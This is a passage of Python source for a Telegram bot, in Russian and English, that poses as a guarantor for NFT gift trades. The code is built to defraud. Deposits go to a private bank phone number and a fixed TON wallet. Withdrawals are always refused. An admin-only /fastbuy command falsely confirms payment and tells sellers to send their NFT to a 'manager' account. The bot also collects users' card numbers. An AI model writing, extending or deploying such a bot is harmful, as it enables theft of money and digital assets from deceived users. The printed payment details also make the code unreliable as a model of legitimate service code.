async def continue_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "🛡 Создать сделку\n\nВыберите тип сделки:",
            deal_type_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "🛡 Create deal\n\nChoose deal type:",
            deal_type_keyboard_en
        )

@dp.callback_query(F.data == "deal_gift")
async def deal_type_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_id = callback.from_user.id
    user_deals[user_id] = {"type": callback.data, "step": "description"}
    
    lang = user_languages.get(user_id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "🛡 Создание сделки\n\n🎁 Введите ссылку(-и) на подарок(-и) в одном из форматов:\nhttps://... или t.me/...\n\nНапример:\nt.me/nft/DurovsCap-1\n\nЕсли у вас несколько подарков, указывайте каждую ссылку с новой строки, например:\n\nt.me/nft/DurovsCap-1\nt.me/nft/PlushPepe-2\nt.me/nft/EternalRose-3",
            back_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "🛡 Creating deal\n\n🎁 Enter gift link(s) in one of the formats:\nhttps://... or t.me/...\n\nExample:\nt.me/nft/DurovsCap-1\n\nIf you have several gifts, put each link on a new line, for example:\n\nt.me/nft/DurovsCap-1\nt.me/nft/PlushPepe-2\nt.me/nft/EternalRose-3",
            back_keyboard_en
        )

@dp.callback_query(F.data.startswith("currency_"))
async def currency_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_id = callback.from_user.id
    currency = callback.data.split("_")[1]
    user_deals[user_id]["currency"] = currency
    user_deals[user_id]["step"] = "amount"
    
    lang = user_languages.get(user_id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"🛡 Создание сделки\n\nВведите сумму сделки в {currency}",
            back_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"🛡 Creating deal\n\nEnter deal amount in {currency}",
            back_keyboard_en
        )

@dp.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "❌ Вы уверены, что хотите отменить сделку?\nЭто действие нельзя будет отменить.",
            cancel_confirm_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "❌ Are you sure you want to cancel the deal?\nThis action cannot be undone.",
            cancel_confirm_keyboard_en
        )

@dp.callback_query(F.data == "confirm_cancel")
async def confirm_cancel_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(callback, "✅ Сделка успешно отменена.")
    else:
        await safe_edit_message(callback, "✅ Deal successfully cancelled.")

@dp.callback_query(F.data == "back_to_deal")
async def back_to_deal_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    await callback.answer("Функция временно недоступна")

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_id = callback.from_user.id
    username = callback.from_user.username or "Не указан"
    balance = user_balances.get(user_id, 0)
    
    stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0})
    total_deals = stats["total"]
    successful_deals = stats["successful"]
    total_turnover = stats["turnover"]
    
    lang = user_languages.get(user_id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"Профиль пользователя\n\n"
            f"Имя пользователя: @{username}\n"
            f"Общий баланс: {balance} RUB\n"
            f"Общий баланс крипто валюты: {balance} RUB\n"
            f"Всего сделок: {total_deals}\n"
            f"Успешных сделок: {successful_deals}\n"
            f"Суммарный оборот: {total_turnover} RUB\n"
            f"Верификация: ❌ Не пройдена",
            profile_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"User profile\n\n"
            f"Username: @{username}\n"
            f"Total balance: {balance} RUB\n"
            f"Total crypto balance: {balance} RUB\n"
            f"Total deals: {total_deals}\n"
            f"Successful deals: {successful_deals}\n"
            f"Total turnover: {total_turnover} RUB\n"
            f"Verification: ❌ Not passed",
            profile_keyboard_en
        )

@dp.callback_query(F.data == "deposit")
async def deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "❓Как работают кнопки выбора валюты?\n\n"
            "Когда вы выбираете, например, На карту → RUB → вводите сумму, бот автоматически считает, сколько нужно пополнить в TON или USDT (сеть TON), чтобы после пополнения у вас хватило средств для оплаты сделки(-ок) на введенную вами сумму.\n\n"
            "💡 Пример: если вы выбираете «На карту → RUB» и вводите 1000, бот подскажет, сколько нужно пополнить для того чтобы вы смогли оплатить сделку на 1000 RUB\n\n"
            "Таким образом, вы всегда пополняете нужную вам сумму для оплаты сделок на любые валюты в валюте TON или USDT",
            read_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "❓How do currency selection buttons work?\n\n"
            "When you select, for example, To card → RUB → enter the amount, the bot automatically calculates how much you need to top up in TON or USDT (TON network) so that after top-up you have enough funds to pay for the deal(s) for the amount you entered.\n\n"
            "💡 Example: if you select «To card → RUB» and enter 1000, the bot will tell you how much you need to top up so that you can pay for a deal of 1000 RUB\n\n"
            "Thus, you always top up the amount you need to pay for deals in any currency in TON or USDT currency",
            read_keyboard_en
        )

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 Пополнение баланса\n\nВыберите способ — бот автоматически рассчитает, сколько TON или же USDT нужно для пополнения.",
            deposit_method_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 Balance top-up\n\nChoose method — the bot will automatically calculate how much TON or USDT is needed for top-up.",
            deposit_method_keyboard_en
        )

@dp.callback_query(F.data == "deposit_card")
async def deposit_card_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"+79275173373 - Ярослав,Сбербанк\n"
            f"Переводите точную сумму и не забывайте мемо комментарий\n\n"
            f"Мемо: {memo}",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"+79275173373 - Yaroslav, Sberbank\n"
            f"Transfer the exact amount and don't forget the memo comment\n\n"
            f"Memo: {memo}",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"(UQC8XYKyH-u5NPNGJEU_WFlqamxCqsai63_e9SuCLOH2m8_E)\n"
            f"Не забудьте указать точную сумму и мемо комментарий\n\n"
            f"Мемо: {memo}",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"(UQC8XYKyH-u5NPNGJEU_WFlqamxCqsai63_e9SuCLOH2m8_E)\n"
            f"Don't forget to specify the exact amount and memo comment\n\n"
            f"Memo: {memo}",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_id = callback.from_user.id
    balance = user_balances.get(user_id, 0)
    lang = user_languages.get(user_id, "ru")
    
    if balance <= 0:
        if lang == "ru":
            await callback.answer("❌ Нет средств для вывода", show_alert=True)
        else:
            await callback.answer("❌ No funds to withdraw", show_alert=True)
    else:
        if lang == "ru":
            await callback.answer("😔 К сожалению вывод сейчас недоступен", show_alert=True)
        else:
            await callback.answer("😔 Unfortunately withdrawal is currently unavailable", show_alert=True)

@dp.callback_query(F.data == "requisites")
async def requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 Управление реквизитами\n\nВыберите одну из предложенных ниже опций:",
            requisites_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 Payment details management\n\nChoose one of the options below:",
            requisites_keyboard_en
        )

@dp.callback_query(F.data == "add_card")
async def add_card_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "➕ Добавить реквизиты карты\n\nПожалуйста, отправьте реквизиты вашей карты в формате:\nНазвание банка - Номер карты\nПример: ЕвроБанк - 1234567891012345",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "➕ Add card details\n\nPlease send your card details in the format:\nBank name - Card number\nExample: EuroBank - 1234567891012345",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "add_ton")
async def add_ton_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "➕ Добавить TON кошелек\n\nПожалуйста, отправьте адрес вашего TON кошелька:\nПример: UQAY6fREx6M7QsnCkUJKNptZdRG-Q_1kW2FAa2Am-aBJs-7X",
            back_simple_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "➕ Add TON wallet\n\nPlease send your TON wallet address:\nExample: UQAY6fREx6M7QsnCkUJKNptZdRG-Q_1kW2FAa2Am-aBJs-7X",
            back_simple_keyboard_en
        )

@dp.callback_query(F.data == "view_requisites")
async def view_requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_id = callback.from_user.id
    requisites = user_requisites.get(user_id, {})
    lang = user_languages.get(user_id, "ru")
    
    if not requisites:
        if lang == "ru":
            await safe_edit_message(callback, "❌ Реквизиты не найдены.", back_simple_keyboard_ru)
        else:
            await safe_edit_message(callback, "❌ Details not found.", back_simple_keyboard_en)
    else:
        requisites_text = "📝 Ваши реквизиты\n\n" if lang == "ru" else "📝 Your details\n\n"
        if "card" in requisites:
            requisites_text += f"{requisites['card']}\n"
        if "ton" in requisites:
            requisites_text += f"{requisites['ton']}\n"
        
        if lang == "ru":
            await safe_edit_message(callback, requisites_text, back_simple_keyboard_ru)
        else:
            await safe_edit_message(callback, requisites_text, back_simple_keyboard_en)

@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "🌍 Изменить язык\n\nВыберите предпочитаемый язык:",
            language_keyboard
        )
    else:
        await safe_edit_message(
            callback,
            "🌍 Change language\n\nChoose your preferred language:",
            language_keyboard
        )

@dp.callback_query(F.data == "lang_ru")
async def lang_ru_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_languages[callback.from_user.id] = "ru"
    await send_main_menu(callback.message.chat.id, "ru", callback.message.message_id)

@dp.callback_query(F.data == "lang_en")
async def lang_en_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_languages[callback.from_user.id] = "en"
    await send_main_menu(callback.message.chat.id, "en", callback.message.message_id)

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

@dp.callback_query(F.data == "back_step")
async def back_step_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    await callback.answer()

@dp.callback_query(F.data == "back_to_requisites")
async def back_to_requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 Управление реквизитами\n\nВыберите одну из предложенных ниже опций:",
            requisites_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 Payment details management\n\nChoose one of the options below:",
            requisites_keyboard_en
        )

@dp.message(Command("fastbuy"))
async def fastbuy_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        deal_id = message.text.split()[1]
    except IndexError:
        await message.answer("⚠️ Используйте: /fastbuy [id сделки]")
        return

    if deal_id not in active_deals:
        await message.answer("❌ Сделка с таким ID не найдена.")
        return

    deal = active_deals[deal_id]
    
    deal["status"] = "payment_confirmed"
    
    seller_lang = user_languages.get(deal["seller_id"], "ru")
    if deal["type"] == "deal_gift":
        text_ru = (
            f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
            f"📜 Предмет: {deal['description']}\n\n"
            f"NFT ожидает отправки на официальный аккаунт менеджера - @NFT_Playerok\n\n"
            f"⚠️ Обратите внимание:\n"
            f"➤ Подарок необходимо передать именно менеджеру, а не покупателю напрямую.\n"
            f"➤ Это стандартный процесс для автоматического завершения сделки через бота.\n\n"
            f"После отправки средства будут зачислены на ваш счёт.\n\n"
            f"⚠️ Важно:\n"
            f"Проверяйте аккаунт перед тем как передать NFT, в случае передачи на фейк аккаунт мы не сможем вам компенсировать ущерб."
        )

        text_en = (
            f"✅ Payment confirmed for deal #{deal_id}\n\n"
            f"📜 Item: {deal['description']}\n\n"
            f"NFT must be sent to the official manager account — @NFT_Playerok\n\n"
            f"⚠️ Attention:\n"
            f"➤ The gift must be sent ONLY to the manager, not to the buyer.\n"
            f"➤ This is a standard process for automatic deal completion via the bot.\n\n"
            f"After sending, the funds will be credited to your balance.\n\n"
            f"⚠️ Important:\n"
            f"Please verify the account before sending the NFT. If you send it to a fake account, we cannot compensate your loss."
        )

        text = text_en if seller_lang == "en" else text_ru

        await bot.send_message(
            deal["seller_id"],
            text,
            reply_markup=seller_gift_keyboard
        )
    else:
        await bot.send_message(
            deal["seller_id"],
            "✅ Payment received. Please send the item to the buyer.",
            reply_markup=seller_gift_keyboard
        )
        
    await message.answer(f"✅ Оплата по сделке #{deal_id} успешно подтверждена (FastBuy).")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
